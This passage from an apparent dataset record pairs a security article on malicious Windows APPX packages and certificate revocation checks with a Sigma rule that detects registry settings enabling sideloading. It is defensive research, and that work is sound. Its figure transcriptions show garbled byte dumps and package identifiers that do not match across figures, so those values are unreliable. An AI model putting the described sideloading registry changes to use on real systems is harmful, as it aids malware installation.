indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Potential Signing Bypass Via Windows Developer Features - Registry",
      "id": "b110ebaf-697f-4da1-afd5-b536fa27a2c1",
      "related": [
        {
          "id": "a383dec4-deec-4e6e-913b-ed9249670848",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when the enablement of developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages.",
      "references": [
        "https://twitter.com/malmoeb/status/1560536653709598721",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
            "\\Policies\\Microsoft\\Windows\\Appx\\"
          ],
          "TargetObject|endswith": [
            "\\AllowAllTrustedApps",
            "\\AllowDevelopmentWithoutDevLicense"
          ],
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_turn_on_dev_features.yml",
    "id": "1027"
  }
]